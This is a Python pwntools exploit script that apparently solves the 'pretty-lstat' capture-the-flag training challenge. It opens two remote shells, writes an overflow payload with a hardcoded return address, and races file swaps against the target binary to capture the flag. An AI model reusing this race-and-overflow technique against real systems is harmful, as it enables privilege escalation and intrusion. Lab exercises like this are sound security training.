
from pwn import *

def get_token(c):
    c.recvuntil(b"token: ")       # Quando facciamo la prima connessione, ci viene stampato: "Initialized  private instance with token: 3c8..." so we read till "token "
    return c.recvline().strip()

# first connection is to the server that gives us the token 
c_token = remote("pretty-lstat.training.offensivedefensive.it", 8080, ssl=True)

token = get_token(c_token)
c_token.close()   

# Now we connect to our private process instance for the real challenge
c_1 = remote("private.training.offensivedefensive.it", 8080, ssl=True)  # first thread
c_1.recvuntil(b"Token: ")                                               # we will be asked the token, so we send it
c_1.sendline(token)

c_2 = remote("private.training.offensivedefensive.it", 8080, ssl=True)  # second thread
c_2.recvuntil(b"Token: ")                                               # we will be asked the token, so we send it
c_2.sendline(token)


c_1.sendline(b"cd /home/user/")
#c_2.sendline(b"cd /home/user/") in the second connection we stay in the root folder since the flag file is located there


# hello.txt file creation
hello_file = b"hello.txt"
command1 = b"echo hello world! > " + hello_file
c_1.sendline(command1)

#check
c_1.sendline(b"ls -l /home/user/")

# exploit.txt file creation
payload = b'printf "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa\\x96\\x12\\x40\\x00\\x00\\x00\\x00\\x00" > /home/user/exploit.txt'
c_1.sendline(payload)

# data.txt file creation
data_file = b"data.txt"
command3 = b"echo hello world! > " + data_file
c_1.sendline(command3) 

#check
c_1.sendline(b"ls -l /home/user/")

#perform the exploit
command_change_content = b"while true; do cp hello.txt data.txt; cp exploit.txt data.txt; done"
c_1.sendline(command_change_content)

command_exploit = b"while true; do ./home/user/pretty_lstat ./home/user/data.txt ./home/user/data.txt ./home/user/data.txt; done"
c_2.sendline(command_exploit)

# interactive on the second connection that is the one running pretty_lstat where we will see the flag
c_2.interactive() 